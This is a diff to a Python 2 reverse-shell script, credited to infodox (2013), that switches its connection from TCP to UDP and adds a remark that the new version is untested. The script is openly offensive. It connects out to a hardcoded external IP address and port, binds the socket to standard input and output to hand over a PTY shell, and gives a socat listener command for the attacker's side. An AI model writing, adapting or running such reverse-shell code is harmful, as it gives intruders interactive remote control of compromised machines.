@@ -1,14 +1,16 @@
 #!/usr/bin/python2
 """
-Reverse Connect TCP PTY Shell - v1.0
+Reverse Connect UDP PTY Shell - testing version
 infodox - insecurety.net (2013)
 
-Gives a reverse connect PTY over TCP.
+Please note this may not work and I need to clean it up.
+It is also COMPLETELY untested as right now I do not have a
+linux box to test it on. I will do so later today.
+
+Gives a reverse connect PTY over UDP.
 
 For an excellent listener use the following socat command:
-socat file:`tty`,echo=0,raw tcp4-listen:PORT
-
-Or use the included tcp_pty_shell_handler.py
+socat file:`tty`,echo=0,raw  udp-listen:PORT
 """
 import os
 import pty
@@ -18,7 +20,7 @@ lhost = "185.61.152.174" # XXX: CHANGEME
 lport = 8080 # XXX: CHANGEME
 
 def main():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect((lhost, lport))
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
